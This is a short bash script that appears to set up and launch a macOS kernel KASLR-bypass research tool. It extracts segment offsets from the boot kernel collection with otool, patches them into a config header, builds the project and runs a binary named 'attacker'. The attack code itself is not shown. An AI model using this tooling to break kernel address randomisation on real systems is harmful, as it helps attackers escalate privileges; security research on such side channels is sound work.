#!/bin/bash

#SYSBUMPS_PATH="Input/Sysbumps/file/path"
SYSBUMPS_PATH=""
FINDKASLR_PAHT=$SYSBUMPS_PATH"/findKASLR"
CONFIG_FILE=$FINDKASLR_PAHT"/config.h"

KERNEL_CACHE="/private/var/db/KernelExtensionManagement/KernelCollections/BootKernelCollection.kc"

if ! test -e "$KERNEL_CACHE"; then
    echo "there is no kerenl cache file."
    echo "Set the kernel cache file path!"
    exit
fi

DATA_OFFSET=$(otool -l "$KERNEL_CACHE"|grep "__DATA$" -A5 | grep "fileoff")
DATA_OFFSET="${DATA_OFFSET:10}"
DATA_SIZE=$(otool -l "$KERNEL_CACHE"|grep "__DATA$" -A5 | grep "filesize")
DATA_SIZE="${DATA_SIZE:10}"

DATA_END=$(($DATA_OFFSET + $DATA_SIZE))
DATA_END=$(printf '%X' $DATA_END)


LINKEDIT_OFFSET=$(otool -l "$KERNEL_CACHE"|grep "__LINKEDIT$" -A5 | grep "fileoff")
LINKEDIT_OFFSET="${LINKEDIT_OFFSET:10}"
LINKEDIT_SIZE=$(otool -l "$KERNEL_CACHE"|grep "__LINKEDIT$" -A5 | grep "filesize")
LINKEDIT_SIZE="${LINKEDIT_SIZE:10}"

LINKEDIT_END=$(($LINKEDIT_OFFSET + $LINKEDIT_SIZE))
LINKEDIT_END=$(printf '%X' $LINKEDIT_END)

cd $FINDKASLR_PAHT

sed -i '' "/#define DATA_END_OFFSET/c\\
#define DATA_END_OFFSET 0x$DATA_END
" $CONFIG_FILE

sed -i '' "/#define KER_SIZE/c\\
#define KER_SIZE 0x$LINKEDIT_END
" $CONFIG_FILE

make -s

./attacker


